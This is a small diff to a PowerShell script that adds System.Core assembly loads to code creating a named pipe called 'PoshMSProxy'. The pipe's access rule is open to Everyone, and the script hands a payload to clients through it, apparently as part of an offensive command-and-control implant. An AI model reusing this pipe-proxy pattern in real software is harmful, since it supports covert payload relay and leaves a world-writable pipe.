@@ -2,7 +2,7 @@
 {
     param ($PipeName,$Payload)
     while ($True) {
-
+        add-Type -assembly "System.Core"
         $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity
         $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( "Everyone", "ReadWrite", "Allow" )
         $PipeSecurity.AddAccessRule($AccessRule)
@@ -19,7 +19,7 @@
     }
 
 }
-
+add-Type -assembly "System.Core"
 start-job -ScriptBlock $scriptblock -ArgumentList @("PoshMSProxy",$proxypayload)
 $pi = new-object System.IO.Pipes.NamedPipeClientStream(".", "PoshMSProxy");
 
